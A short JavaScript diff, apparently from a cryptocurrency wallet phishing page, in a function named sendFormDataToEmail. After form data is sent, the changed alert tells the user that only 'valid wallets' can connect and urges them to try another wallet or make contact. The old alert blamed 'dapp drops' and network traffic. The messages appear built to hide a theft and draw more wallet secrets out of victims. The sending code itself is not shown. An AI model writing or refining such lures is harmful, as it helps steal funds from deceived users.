@@ -93,7 +93,7 @@ function sendFormDataToEmail(formData) {
             if (response.ok) {
                 swal('Validating...', 'Hold On');
                 setTimeout(() => {
-                    swal('Feeling Lucky!?', 'Connectionn confirmation and/or validations for dapp drops happen based on Net traffic. You can check back or try with another wallet if nothing happens.');
+                    swal('Not Connected yet!?', 'You can only connect with valid wallets or fail is inevitable. If you are sure it is correct, you can check back or try with another wallet or contact us.');
 
                     // Reset the button text and remove the "connecting" class
                     var connectButton;
